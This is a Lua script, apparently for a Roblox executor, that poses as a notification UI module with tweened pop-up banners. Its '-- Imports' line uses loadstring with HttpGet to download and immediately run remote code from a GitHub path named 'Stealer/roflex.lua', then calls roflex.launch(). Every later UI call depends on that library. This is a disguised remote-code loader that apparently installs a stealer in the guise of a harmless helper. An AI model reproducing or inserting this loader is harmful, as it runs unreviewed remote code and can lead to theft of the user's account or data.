-- NotificationModule.lua
-- Version 1.0

local NotificationModule = {}

-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

-- Imports
local roflex = loadstring(game:HttpGet("https://github.com/xxpwnxxx420lord/Wuno/blob/main/Stealer/roflex.lua?raw=true"))()
if not roflex_ran then
    roflex.launch()
end

-- Variables
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer and localPlayer:WaitForChild("PlayerGui") or nil

local liveNotifs = 0
local project, build = "Silicone", "final"

-- Helper functions

local function isInstance(object)
    return object and typeof(object) == "Instance"
end

local function tween(instance, goalProps, duration)
    if isInstance(instance) then
        local info = TweenInfo.new(duration, Enum.EasingStyle.Back)
        local animation = TweenService:Create(instance, info, goalProps)
        animation:Play()
    end
end

local function applyDropshadow(parent, shadowSize)
    if not isInstance(parent) then return end

    roflex.add(parent, "corner", "UICorner", {CornerRadius = UDim.new(0, 12)})
    roflex.add(parent, "lines", "UIStroke", {Transparency = 0.5, Color = Color3.fromRGB(60, 60, 60)})
    roflex.add(parent, "shadow", "ImageLabel", {
        BackgroundTransparency = 1,
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromScale(0.5, 0.5),
        Size = UDim2.new(1, shadowSize, 1, 35),
        ImageColor3 = Color3.fromRGB(0, 0, 0),
        Image = "rbxassetid://8992230677",
        ImageTransparency = 0.7,
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(99, 99, 99, 99),
    })

    local wallpaper_1 = roflex.add(parent, "_1", "ImageLabel", {
        AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundTransparency = 1,
        Size = UDim2.fromScale(1, 1),
        Image = "rbxassetid://9968344227",
        ScaleType = Enum.ScaleType.Tile,
        TileSize = UDim2.fromOffset(128, 128),
        ImageTransparency = 0.94,
    })
    roflex.add(wallpaper_1, "corner", "UICorner", {CornerRadius = UDim.new(0, 8)})

    local wallpaper_2 = roflex.add(parent, "_2", "ImageLabel", {
        BackgroundTransparency = 1,
        Size = UDim2.fromScale(1, 1),
        Image = "rbxassetid://9968344105",
        ScaleType = Enum.ScaleType.Tile,
        TileSize = UDim2.fromOffset(128, 128),
        ImageTransparency = 0.98,
    })
    roflex.add(wallpaper_2, "corner", "UICorner", {CornerRadius = UDim.new(0, 8)})
end

-- Cleanup old UI if exists
for _, ui in CoreGui:GetChildren() do
    if ui:IsA("ScreenGui") and ui.Name == project .. "-" .. build then
        roflex.remove(ui, 0)
    end
end

-- Create main UI container
local screenGui = roflex.add(CoreGui, project .. "-" .. build, "ScreenGui", {
    ResetOnSpawn = false,
})

local backbone = roflex.add(screenGui, "backbone", "Frame", {
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.fromScale(0.5, 0.5),
    Size = UDim2.fromScale(0.9, 0.9),
    BackgroundTransparency = 1,
})

roflex.add(backbone, "notifies", "Folder")

-- Public API

--- Show a notification with text, emoji, and optional duration
-- @param text string - The notification text
-- @param emoji string - Emoji or icon to display
-- @param duration number - How long the notification stays visible (default 3)
function NotificationModule.Notify(text, emoji, duration)
    duration = duration or 3

    if not isInstance(backbone) then return end

    local folder = backbone:FindFirstChild("notifies")
    if not folder then return end

    liveNotifs += 1

    local background = roflex.add(folder, "_" .. (liveNotifs), "Frame", {
        AnchorPoint = Vector2.new(0.5, 0),
        BackgroundTransparency = 0.2,
        Position = UDim2.new(0.5, 0, 0, -200),
        Size = UDim2.fromOffset(0, 15),
        AutomaticSize = Enum.AutomaticSize.X,
        BackgroundColor3 = Color3.fromRGB(30, 30, 30),
    })

    roflex.add(background, "padding", "UIPadding", {PaddingLeft = UDim.new(0, 25), PaddingRight = UDim.new(0, 25)})
    applyDropshadow(background, 90)

    roflex.add(background, "message", "TextLabel", {
        AutomaticSize = Enum.AutomaticSize.X,
        BackgroundTransparency = 1,
        Size = UDim2.fromScale(0, 1),
        ZIndex = 2,
        Text = text .. "  " .. emoji,
        TextColor3 = Color3.fromRGB(225, 225, 225),
        TextSize = 16,
        RichText = true,
        FontFace = Font.new("rbxassetid://12187365364"),
    })

    tween(background, {Position = UDim2.new(0.5, 0, 0, liveNotifs * 57)}, 0.45)
    tween(background, {Size = UDim2.fromOffset(0, 50)}, 0.65)

    task.delay(duration, function()
        tween(background, {Position = UDim2.new(0.5, 0, 0, -180)}, 0.35)
        tween(background, {Size = UDim2.fromOffset(0, 30)}, 0)
        liveNotifs -= 1
    end)

    roflex.remove(background, duration + 1)
end

return NotificationModule
